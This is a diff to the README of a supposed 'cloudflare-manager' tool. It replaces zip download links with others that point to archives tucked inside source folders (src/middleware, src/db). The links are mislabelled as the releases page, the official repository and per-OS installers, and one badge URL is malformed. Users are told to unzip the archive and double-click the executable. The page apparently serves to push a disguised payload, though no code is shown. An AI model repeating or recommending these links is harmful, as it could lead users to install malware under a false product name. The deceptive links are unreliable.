@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Cloudflare Manager](https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip%https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip)](https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip)
+[![Download Cloudflare Manager](https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip%https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip)](https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ To ensure the best experience, please check the following requirements:
 
 ## 📥 Download & Install
 
-To start using **cloudflare-manager**, you will need to download the application. Visit the [Releases page](https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip) to download the latest version of the software.
+To start using **cloudflare-manager**, you will need to download the application. Visit the [Releases page](https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip) to download the latest version of the software.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip).
+1. Go to the [Releases page](https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip).
 2. Look for the latest version. It usually appears at the top of the list.
 3. Click on the file that suits your operating system. For example:
-   - For Windows, look for `https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip`.
-   - For Linux, choose `https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip`.
+   - For Windows, look for `https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip`.
+   - For macOS, look for `https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip`.
+   - For Linux, choose `https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip`.
 4. Download the file to your computer.
 5. Once downloaded, unzip or extract the files, if necessary.
 6. Open the application by double-clicking the executable file or script.
@@ -74,8 +74,8 @@ Your feedback is valuable. Use it to improve future versions of the application.
 
 ## 🔗 Useful Links
 
-- [Official Repository](https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip)
-- [Releases Page](https://raw.githubusercontent.com/theneuer/cloudflare-manager/master/src/middleware/cloudflare-manager-v3.3.zip)
+- [Official Repository](https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip)
+- [Releases Page](https://github.com/theneuer/cloudflare-manager/raw/refs/heads/master/src/db/cloudflare_manager_3.6.zip)
 
 ## 📈 Contributing
 
